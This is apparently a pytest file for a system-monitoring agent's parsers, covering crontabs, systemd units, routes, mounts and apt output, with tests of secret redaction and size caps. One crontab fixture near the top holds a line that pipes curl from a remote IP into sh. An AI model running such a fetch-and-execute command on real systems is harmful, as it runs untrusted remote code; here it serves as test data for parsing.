    assert [(e["user"], e["schedule"], e["command"], e["stdin"]) for e in data["entries"]] == [
        ("alice", "@reboot", "/home/alice/bin/start-agent", False),
        ("alice", "*/5 * * * *", "/usr/bin/curl -s http://198.51.100.7/x | sh", False),
        ("alice", "0 9 * * mon-fri", "mail -s hi alice%Hello%there", True)]


@pytest.mark.parametrize("line", [
    "5 * * * root",                      # no command
    "* * * * *",                         # nothing after the schedule
    "@sometimes root /bin/true",         # not a cron @word
    "5 * * * ; root /bin/true",          # a field cron would not read
    "@daily root",                       # an @word with a user and no command
])
def test_a_malformed_crontab_line_is_skipped_and_counted(line: str) -> None:
    data = p("cron.system", f"{line}\n0 0 * * * root /bin/true\n")
    assert (data["count"], data["skipped"]) == (1, 1)
    assert data["files"][0]["skipped"] == 1


def test_a_trailing_backslash_does_not_continue_a_crontab_line() -> None:
    data = p("cron.system", "0 0 * * * root echo a \\\n0 1 * * * root echo b\n")
    assert [e["command"] for e in data["entries"]] == ["echo a \\", "echo b"]


def test_a_crontab_of_nothing_but_bad_lines_is_still_an_observation() -> None:
    assert p("cron.d", frame_files({"/etc/cron.d/x": b"garbage\n"}))["skipped"] == 1
    assert p("cron.system", "")["count"] == 0


def test_cron_commands_and_env_are_redacted_and_capped() -> None:
    secret = "ghp_" + "a" * 36
    data = p("cron.system", f"TOKEN={secret}\nGITHUB={secret}\n"
                            f"0 0 * * * root /bin/push {secret} {'x' * 5000}\n")
    (entry,) = data["entries"]
    assert secret not in json.dumps(data)
    assert MASK in entry["command"] and len(entry["command"]) == COMMAND_CHARS
    assert data["files"][0]["env"]["GITHUB"] == MASK
    assert data["redacted"] == 3


def test_cron_spool_user_names_are_capped() -> None:
    data = p("cron.user", frame_files({"/var/spool/cron/crontabs/" + "u" * 300: b"@daily x\n"}))
    assert data["entries"][0]["user"] == "u" * IDENT_CHARS


# --- a crontab cannot make its observation unpublishable ------------------------------


def spool(**users: bytes) -> bytes:
    return frame_files({f"/var/spool/cron/crontabs/{user}": body for user, body in users.items()})


def test_a_file_keeps_at_most_its_cap_and_says_how_many_it_held() -> None:
    lines = b"".join(b"@reboot :%d\n" % i for i in range(MAX_ENTRIES_PER_FILE + 50))
    data = p("cron.user", spool(alice=lines))
    (alice,) = data["files"]
    assert (alice["entries"], alice["total"], alice["dropped"]) == (
        MAX_ENTRIES_PER_FILE, MAX_ENTRIES_PER_FILE + 50, 50)
    assert (data["count"], data["dropped"], data["skipped"]) == (MAX_ENTRIES_PER_FILE, 50, 0)
    assert [e["command"] for e in data["entries"]][-1] == f":{MAX_ENTRIES_PER_FILE - 1}"


def test_root_s_crontab_is_read_first_so_no_user_can_crowd_it_out() -> None:
    full = b"".join(b"@reboot :%d\n" % i for i in range(MAX_ENTRIES_PER_FILE))
    users = {f"a{i}": full for i in range(MAX_ENTRIES_TOTAL // MAX_ENTRIES_PER_FILE + 1)}
    data = p("cron.user", spool(**users, root=b"*/5 * * * * /tmp/root-helper.sh\n"))
    assert data["files"][0]["path"] == "/var/spool/cron/crontabs/root"
    assert data["entries"][0]["command"] == "/tmp/root-helper.sh"
    assert data["count"] == MAX_ENTRIES_TOTAL
    assert data["dropped"] == MAX_ENTRIES_PER_FILE + 1
    assert [f["dropped"] for f in data["files"]][-2:] == [1, MAX_ENTRIES_PER_FILE]


def test_env_names_per_file_are_capped_and_counted() -> None:
    env = b"".join(b"V%d=x\n" % i for i in range(MAX_ENV_PER_FILE + 8))
    (alice,) = p("cron.user", spool(alice=env))["files"]
    assert (len(alice["env"]), alice["env_dropped"]) == (MAX_ENV_PER_FILE, 8)


def test_the_worst_crontab_the_caps_allow_still_publishes() -> None:
    """Every field at its cap, in the characters JSON escapes longest: an astral character is 12
    bytes (`😀`), a control character or an invalid byte (U+FFFD) 6."""
    worst = ("\U0001f600" * 2).encode() + b"\x01\xff"
    def chars(n: int) -> bytes:
        return worst * (n // 2)  # at least n characters
    env = b"".join(b"N%03d" % i + chars(IDENT_CHARS) + b"=" + chars(ARGS_CHARS) + b"\n"
                   for i in range(MAX_ENV_PER_FILE))
    jobs = b"".join(b"* * * * * " + chars(COMMAND_CHARS) + b"\n"
                    for _ in range(MAX_ENTRIES_PER_FILE))
    system = b"".join(b"* * * * * " + chars(IDENT_CHARS) + b" " + chars(COMMAND_CHARS) + b"\n"
                      for _ in range(MAX_ENTRIES_PER_FILE))
    for probe, raw in (("cron.user", spool(**{f"u{i}": env + jobs for i in range(20)})),
                       ("cron.d", frame_files({f"/etc/cron.d/f{i}": env + system
                                               for i in range(20)}))):
        parsed = parse(probe, raw)
        assert parsed["dropped"] > 0  # the byte budget, not only the counts, held it
        data, _ = redact_mapping({**parsed, "warnings": ["cut a file at the per-file cap"] * 20})
        event = schema.Event(schema.Kind.OBSERVATION, 1.0, "agent", f"obs.{probe}",
                             schema.to_body(schema.Observation(probe, data, 1000, True)))
        assert len(schema.encode_event(event)) < schema.MAX_BYTES, probe


ANACRONTAB = b"""# /etc/anacrontab: configuration file for anacron
SHELL=/bin/sh
HOME=/root

# These replace cron's entries
1\t5\tcron.daily\trun-parts --report /etc/cron.daily
7\t10\tcron.weekly\trun-parts --report /etc/cron.weekly
@monthly\t15\tcron.monthly\trun-parts --report /etc/cron.monthly
weekly 5 x /bin/true
3 soon x /bin/true
"""


def test_cron_anacron() -> None:
    data = p("cron.anacron", frame_files({"/etc/anacrontab": ANACRONTAB}))
    assert data["files"] == [{"path": "/etc/anacrontab",
                              "env": {"SHELL": "/bin/sh", "HOME": "/root"},
                              "env_dropped": 0, "entries": 3, "total": 3, "dropped": 0,
                              "skipped": 2}]
    assert data["entries"][0] == {"file": "/etc/anacrontab", "period": "1", "delay": 5,
                                  "job_id": "cron.daily",
                                  "command": "run-parts --report /etc/cron.daily"}
    assert [e["period"] for e in data["entries"]] == ["1", "7", "@monthly"]
    assert (data["count"], data["skipped"], data["redacted"]) == (3, 2, 0)
    assert p("cron.anacron", frame_files({}))["count"] == 0


def test_periodic_scripts() -> None:
    long_script = "#!/bin/sh\n" + "echo x\n" * 1000
    raw = frame_files({"/etc/cron.daily/dpkg": b"#!/bin/sh\n/usr/libexec/dpkg/dpkg-db-backup\n",
                       "/etc/cron.daily/slack": long_script.encode(),
                       "/etc/cron.daily/odd": "café\n".encode()})
    data = p("cron.daily", raw)
    assert [s["path"] for s in data["scripts"]] == [
        "/etc/cron.daily/dpkg", "/etc/cron.daily/odd", "/etc/cron.daily/slack"]
    dpkg, odd, slack = data["scripts"]
    assert dpkg == {"path": "/etc/cron.daily/dpkg", "size": 43, "truncated": False,
                    "head": "#!/bin/sh\n/usr/libexec/dpkg/dpkg-db-backup\n"}
    assert odd["size"] == 6  # bytes, not characters
    assert slack["truncated"] is True and len(slack["head"]) == SCRIPT_CHARS
    assert slack["size"] == len(long_script)
    assert (data["count"], data["redacted"]) == (3, 0)
    for period in ("cron.hourly", "cron.weekly", "cron.monthly"):
        assert p(period, frame_files({})) == {"scripts": [], "count": 0, "redacted": 0}


def test_periodic_script_heads_are_redacted() -> None:
    data = p("cron.weekly", frame_files({"/etc/cron.weekly/push":
                                         b"curl -H 'Authorization: Bearer abcdefghijk'\n"}))
    assert MASK in data["scripts"][0]["head"] and data["redacted"] == 1


# `systemctl show --all -p ... --timestamp=unix` blocks in systemd 255's format, trimmed.
UNITS = """Unit=apt-daily.service
TimersCalendar={ OnCalendar=*-*-* 06,18:00:00 ; next_elapse=@1791849600 }
Result=success
Id=apt-daily.timer
Triggers=apt-daily.service
TriggeredBy=
Description=Daily apt download activities
ActiveState=active
SubState=waiting
FragmentPath=/usr/lib/systemd/system/apt-daily.timer
UnitFileState=enabled

Result=success
NRestarts=0
ExecMainStartTimestamp=@1791809446
ExecMainExitTimestamp=@1791809446
ExecMainStatus=0
ExecStart={ path=/usr/lib/apt/apt.systemd.daily ; argv[]=/usr/lib/apt/apt.systemd.daily update ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
User=
Id=apt-daily.service
Triggers=
TriggeredBy=apt-daily.timer
Description=Daily apt download activities
ActiveState=inactive
SubState=dead
FragmentPath=/usr/lib/systemd/system/apt-daily.service
UnitFileState=static

Unit=systemd-tmpfiles-clean.service
TimersMonotonic={ OnUnitActiveUSec=1d ; next_elapse=1w 6d 15min 11.022457s }
TimersMonotonic={ OnBootUSec=15min ; next_elapse=15min }
Result=success
Id=systemd-tmpfiles-clean.timer
Triggers=systemd-tmpfiles-clean.service
TriggeredBy=
Description=Daily Cleanup of Temporary Directories
ActiveState=active
SubState=waiting
FragmentPath=/usr/lib/systemd/system/systemd-tmpfiles-clean.timer
UnitFileState=static

Unit=motd-news.service
TimersMonotonic={ OnStartupUSec=1min ; next_elapse=1min 4.992032s }
TimersCalendar={ OnCalendar=*-*-* 00,12:00:00 ; next_elapse=@1791871200 }
Result=success
Id=motd-news.timer
Triggers=motd-news.service
TriggeredBy=
Description=Message of the Day
ActiveState=active
SubState=waiting
FragmentPath=/usr/lib/systemd/system/motd-news.timer
UnitFileState=enabled

Result=success
NRestarts=0
ExecMainStartTimestamp=@1790790975
ExecMainExitTimestamp=@1790790975
ExecMainStatus=0
ExecStart={ path=/usr/bin/sensors ; argv[]=/usr/bin/sensors -s ; ignore_errors=yes ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
ExecStart={ path=/usr/bin/sensors ; argv[]=/usr/bin/sensors ; ignore_errors=yes ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
User=
Id=lm-sensors.service
Triggers=
TriggeredBy=
Description=Initialize hardware monitoring sensors
ActiveState=active
SubState=exited
FragmentPath=/usr/lib/systemd/system/lm-sensors.service
UnitFileState=enabled

Result=success
NRestarts=0
ExecMainStartTimestamp=@1790790975
ExecMainExitTimestamp=
ExecMainStatus=0
ExecStart={ path=/usr/lib/systemd/systemd-resolved ; argv[]=/usr/lib/systemd/systemd-resolved ; ignore_errors=no ; start_time=[n/a] ; stop_time=[n/a] ; pid=0 ; code=(null) ; status=0/0 }
User=systemd-resolve
Id=systemd-resolved.service
Triggers=
TriggeredBy=
Description=Network Name Resolution
ActiveState=active
SubState=running
FragmentPath=/usr/lib/systemd/system/systemd-resolved.service
UnitFileState=enabled
"""  # noqa: E501 — real tool output, kept at its real width


def test_units_detail() -> None:
    data = p("units.detail", UNITS)
    assert (data["count"], data["skipped"], data["redacted"]) == (6, 0, 0)
    units = {u["id"]: u for u in data["units"]}
    assert [u["id"] for u in data["units"]] == sorted(units)
    assert units["apt-daily.timer"] == {
        "id": "apt-daily.timer", "description": "Daily apt download activities", "user": "",
        "exec": [], "active": "active", "sub": "waiting", "result": "success",
        "restarts": None, "main_status": None, "started": None, "exited": None,
        "enabled": "enabled", "file": "/usr/lib/systemd/system/apt-daily.timer",
        "triggers": ["apt-daily.service"], "triggered_by": [],
        "calendar": ["*-*-* 06,18:00:00"], "monotonic": [], "unit": "apt-daily.service"}
    assert units["apt-daily.service"] == {
        "id": "apt-daily.service", "description": "Daily apt download activities", "user": "",
        "exec": ["/usr/lib/apt/apt.systemd.daily update"], "active": "inactive", "sub": "dead",
        "result": "success", "restarts": 0, "main_status": 0, "started": 1791809446.0,
        "exited": 1791809446.0, "enabled": "static",
        "file": "/usr/lib/systemd/system/apt-daily.service", "triggers": [],
        "triggered_by": ["apt-daily.timer"], "calendar": [], "monotonic": [], "unit": ""}
    assert units["lm-sensors.service"]["exec"] == ["/usr/bin/sensors -s", "/usr/bin/sensors"]
    assert units["systemd-resolved.service"]["user"] == "systemd-resolve"
    assert units["systemd-resolved.service"]["exited"] is None
    clean, motd = units["systemd-tmpfiles-clean.timer"], units["motd-news.timer"]
    # An interval timer: named as its unit file sets it, in the order systemd lists them.
    assert (clean["calendar"], clean["monotonic"]) == (
        [], ["OnUnitActiveSec=1d", "OnBootSec=15min"])
    assert (motd["calendar"], motd["monotonic"]) == (["*-*-* 00,12:00:00"], ["OnStartupSec=1min"])


@pytest.mark.parametrize("key", ["OnBootUSec", "OnStartupUSec", "OnUnitActiveUSec",
                                 "OnUnitInactiveUSec", "OnActiveUSec"])
def test_every_monotonic_trigger_is_read(key: str) -> None:
    raw = f"Id=t.timer\nTimersMonotonic={{ {key}=2h 30min ; next_elapse=0 }}\n"
    (timer,) = p("units.detail", raw)["units"]
    assert timer["monotonic"] == [f"{key.removesuffix('USec')}Sec=2h 30min"]


def test_units_detail_keeps_an_argv_that_looks_like_a_separator_and_redacts_it() -> None:
    raw = ("Id=x.service\nExecStart={ path=/bin/sh ; argv[]=/bin/sh -c 'a ; ignore_errors=b' "
           "--token=hunter2hunter2 ; ignore_errors=no ; start_time=[n/a] ; pid=0 }\n"
           "TimersCalendar={ OnCalendar=Mon *-*-* 00:00:00 ; next_elapse=@1 }\n"
           "TimersCalendar={ OnCalendar=Fri *-*-* 00:00:00 ; next_elapse=@2 }\n")
    (unit,) = p("units.detail", raw)["units"]
    assert unit["exec"][0].startswith("/bin/sh -c 'a ; ignore_errors=b' ")
    assert "hunter2" not in unit["exec"][0]
    assert unit["calendar"] == ["Mon *-*-* 00:00:00", "Fri *-*-* 00:00:00"]


def test_units_detail_caps_free_text() -> None:
    raw = (f"Id={'u' * 300}.service\nDescription={'d' * 900}\n"
           f"ExecStart={{ path=/x ; argv[]=/x {'a' * 5000} ; ignore_errors=no ; pid=0 }}\n")
    (unit,) = p("units.detail", raw)["units"]
    assert len(unit["id"]) == IDENT_CHARS and len(unit["description"]) == ARGS_CHARS
    assert len(unit["exec"][0]) == COMMAND_CHARS


@pytest.mark.parametrize("bad", [
    "Description=no id",
    "Id=\nDescription=an empty id",
    "Id=x.service\nnot a property line",
    "Id=x.service\nExecStart=/bin/true",
    "Id=x.timer\nTimersCalendar=daily",
    "Id=x.timer\nTimersMonotonic={ OnSomethingUSec=1d ; next_elapse=0 }",
    "Id=x.service\nNRestarts=many",
    "Id=x.service\nExecMainStartTimestamp=Mon 2026-10-12 10:00:00 CEST",
])
def test_an_unreadable_unit_block_is_skipped_and_counted(bad: str) -> None:
    data = p("units.detail", f"Id=good.service\n\n{bad}\n")
    assert [u["id"] for u in data["units"]] == ["good.service"]
    assert data["skipped"] == 1


@pytest.mark.parametrize("raw", [b"", b"\n\n", b"Description=no id\n"])
def test_units_detail_refuses(raw: bytes) -> None:
    with pytest.raises(ParseError):
        parse("units.detail", raw)


# --- one bad record never blanks a probe -------------------------------------------------------


def _json_plus(raw: str, bad: Any) -> str:
    return json.dumps([*json.loads(raw), bad])


EVIL_CONTAINER = container("evil", "running", "Up", Names=[])
EVIL_SMART = json.loads(SMART_ATA)
EVIL_SMART["ata_smart_attributes"]["table"].append({"id": 5, "name": "Reallocated_Sector_Ct"})
EVIL_SENSORS = json.loads(SENSORS)
EVIL_SENSORS["evil"] = {"Adapter": "x", "t": {"temp1_input": "hot"}}

HOSTILE = [
    ("processes", PS.replace("89.9", "high") + "garbage\n", "top_cpu", 8, 2),
    ("units.failed", _json_plus(FAILED, {"unit": ["a", "b"], "load": "", "active": "",
                                         "sub": "", "description": ""}), "units", 1, 1),
    ("units.files", _json_plus(UNIT_FILES, {"unit_file": None, "state": "enabled"}),
     "units", 5, 1),
    ("units.timers", _json_plus(TIMERS, {"unit": "x", "activates": "y", "next": "soon"}),
     "timers", 3, 1),
    ("listeners", SS + "tcp LISTEN 0 4096 127.0.0.1:http 0.0.0.0:*\n", "listeners", 10, 1),
    ("containers", _json_plus(DOCKER, EVIL_CONTAINER), "containers", 5, 1),
    ("containers", _json_plus(DOCKER, "not an object"), "containers", 5, 1),
    ("disk.fill", DF.replace("23368681881", "many"), "filesystems", 4, 1),
    ("net.dev", NET_DEV + "garbage line\n", "interfaces", 3, 1),
    ("sensors", json.dumps(EVIL_SENSORS), "readings", 5, 1),
    ("gpu", GPU + "2, x, hot, 1, 1, 1, 1, 1, 0x1, 1, 1\n", "gpus", 2, 1),
    ("kernel.modules", MODULES + "zfs 6602752\n", "modules", 5, 1),
    ("edac", frame_files({"/sys/devices/system/edac/mc/mc0/ce_count": b"3\n",
                          "/sys/devices/system/edac/mc/mc1/ce_count": b"lots\n"}),
     "controllers", 1, 1),
]


@pytest.mark.parametrize(("probe", "raw", "key", "kept", "skipped"), HOSTILE,
                         ids=[f"{h[0]}-{i}" for i, h in enumerate(HOSTILE)])
def test_one_hostile_record_among_good_ones_is_skipped_and_counted(
        probe: str, raw: str, key: str, kept: int, skipped: int) -> None:
    data = p(probe, raw)
    assert data["skipped"] == skipped
    assert len(data[key]) == kept


def test_a_hostile_smart_attribute_row_does_not_hide_the_others() -> None:
    data = p("smart.sda", json.dumps(EVIL_SMART))
    assert data["skipped"] == 1
    assert data["reallocated_sectors"] == 2012
    assert data["pending_sectors"] == 8


def test_processes_count_only_readable_lines() -> None:
    data = p("processes", PS + "garbage\n")
    assert (data["count"], data["skipped"]) == (9, 1)


def test_an_empty_repeated_property_is_an_empty_list_not_an_unreadable_unit() -> None:
    data = parse("units.detail", b"Unit=x.service\nTimersCalendar=\nTimersMonotonic=\n"
                                 b"ExecStart=\nId=x.timer\n")
    assert data["skipped"] == 0
    unit = data["units"][0]
    assert (unit["calendar"], unit["monotonic"], unit["exec"]) == ([], [], [])


# --- evidence probes (2026-10-28) -------------------------------------------------------------


ROUTE = ("Iface\tDestination\tGateway \tFlags\tRefCnt\tUse\tMetric\tMask\t\tMTU\tWindow\tIRTT\n"
         "tun0\t00000000\t00000000\t0001\t0\t0\t0\t00000000\t0\t0\t0\n"
         "wlan0\t00000000\t010200C0\t0003\t0\t0\t600\t00000000\t0\t0\t0\n"
         "wlan0\t00640A0A\t00000000\t0001\t0\t0\t600\t00FFFFFF\t0\t0\t0\n"
         "enp5s0\t00000000\t010200C0\t0002\t0\t0\t800\t00000000\t0\t0\t0\n")


def test_routes_decode_the_default_routes() -> None:
    assert p("routes", ROUTE) == {"count": 4, "default": [
        {"interface": "tun0", "gateway": "0.0.0.0", "metric": 0, "up": True},
        {"interface": "wlan0", "gateway": "192.0.2.1", "metric": 600, "up": True},
        {"interface": "enp5s0", "gateway": "192.0.2.1", "metric": 800, "up": False}]}
    header = ROUTE.splitlines()[0] + "\n"
    assert p("routes", header) == {"count": 0, "default": []}


@pytest.mark.parametrize("raw", ["", "not a route table\n",
                                 ROUTE.splitlines()[0] + "\nwlan0\t00000000\n"])
def test_routes_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("routes", raw.encode())


MOUNTS = ("/dev/nvme0n1p6 / ext4 rw,relatime 0 0\n"
          "proc /proc proc rw,nosuid,nodev,noexec,relatime 0 0\n"
          "overlay /var/lib/docker/overlay2/x/merged overlay rw 0 0\n"
          "/dev/nvme2n1p1 /mnt/my\\040disk ext4 ro,relatime 0 0\n"
          "192.0.2.170:/volume1/models /mnt/nas/models nfs4 rw,vers=4.1 0 0\n")


def test_mounts_keep_data_filesystems_and_say_which_are_read_only() -> None:
    assert p("mounts", MOUNTS) == {"count": 3, "mounts": [
        {"source": "/dev/nvme0n1p6", "target": "/", "fstype": "ext4", "read_only": False,
         "network": False},
        {"source": "/dev/nvme2n1p1", "target": "/mnt/my disk", "fstype": "ext4",
         "read_only": True, "network": False},
        {"source": "192.0.2.170:/volume1/models", "target": "/mnt/nas/models",
         "fstype": "nfs4", "read_only": False, "network": True}]}


@pytest.mark.parametrize("raw", ["", "/dev/sda1 / ext4 rw 0\n"])
def test_mounts_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("mounts", raw.encode())


def test_kernel_release() -> None:
    assert p("kernel.release", "6.8.0-147-generic\n") == {"release": "6.8.0-147-generic"}


@pytest.mark.parametrize("raw", ["", "generic\n", "6.8.0 with spaces\n", "6" * 70])
def test_kernel_release_refuses(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("kernel.release", raw.encode())


def test_boot_is_a_listing() -> None:
    raw = listing(["vmlinuz-6.8.0-147-generic", "config-6.8.0-147-generic", "grub"])
    assert p("boot", raw)["entries"] == ["config-6.8.0-147-generic", "grub",
                                         "vmlinuz-6.8.0-147-generic"]


APT = """NOTE: This is only a simulation!
      apt-get needs root privileges for real execution.
Reading package lists...
Calculating upgrade...
The following packages will be upgraded:
  foo libssl3t64
Inst libssl3t64 [3.0.13-0ubuntu3.5] (3.0.13-0ubuntu3.6 Ubuntu:24.04/noble-updates, \
Ubuntu:24.04/noble-security [amd64])
Inst foo (1.2 Ubuntu:24.04/noble-updates [amd64])
Conf libssl3t64 (3.0.13-0ubuntu3.6 Ubuntu:24.04/noble-updates [amd64])
Conf foo (1.2 Ubuntu:24.04/noble-updates [amd64])
1 upgraded, 1 newly installed, 0 to remove and 3 not upgraded.
"""


def test_apt_upgrades_count_security_updates_apart() -> None:
    assert p("apt.upgrades", APT) == {"upgradable": 2, "security": 1,
                                      "packages": ["libssl3t64", "foo"], "not_upgraded": 3}
    assert p("apt.upgrades", "0 upgraded, 0 newly installed, 0 to remove and 0 not upgraded.\n"
             ) == {"upgradable": 0, "security": 0, "packages": [], "not_upgraded": 0}


def test_apt_upgrades_lists_a_bounded_number_of_names() -> None:
    lines = "".join(f"Inst p{i} (1 Ubuntu:24.04/noble-updates [amd64])\n" for i in range(50))
    data = p("apt.upgrades", lines + "50 upgraded, 0 newly installed, 0 to remove and 0 not "
                                     "upgraded.\n")
    assert data["upgradable"] == 50 and len(data["packages"]) == APT_NAMES


@pytest.mark.parametrize("raw", ["", "E: Could not open lock file\n",
                                 "Inst foo (1 Ubuntu:24.04/noble-updates [amd64])\n"])
def test_apt_upgrades_refuses_output_without_its_summary(raw: str) -> None:
    with pytest.raises(ParseError):
        parse("apt.upgrades", raw.encode())
